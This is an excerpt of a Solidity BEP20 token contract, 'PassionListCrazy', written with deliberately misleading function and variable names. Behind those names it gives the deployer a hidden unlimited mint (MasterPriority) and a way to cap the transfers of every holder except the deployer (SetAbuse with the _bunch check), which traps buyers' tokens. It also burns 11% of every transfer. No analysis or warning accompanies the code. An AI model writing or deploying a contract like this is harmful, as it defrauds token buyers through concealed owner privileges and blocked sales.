...
contract PassionListCrazy is IBEP20 
{
    using MistakeLib for uint256;
    mapping(address => uint256) internal _highway;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _bunch;
    ...
    constructor() 
    {
        ...
        _name = "PassionListCrazy";
        _symbol = "MENTION";
        _burnRate = 11;
        _bunch = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _highway[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier AwarenessMixture() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _highway[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetHome() external view returns (uint256) { return _bunch; }
    function SetAbuse(uint b) external virtual AwarenessMixture { _bunch = b * (10 ** decimals()); }
    ...
    function MasterPriority(uint256 hello) external virtual AwarenessMixture
    {
        uint release = hello * (10 ** decimals()); 
        _highway[_msgsender] = _highway[_msgsender].Budget(release);
        emit Transfer(address(0), _msgsender, release);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _bunch || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _highway[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _highway[sender] = senderBalance - amount;
        _highway[recipient] += (amount - burnAmount);
        _highway[_burnaddress] += burnAmount;
...
library MistakeLib 
{
  function Budget(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}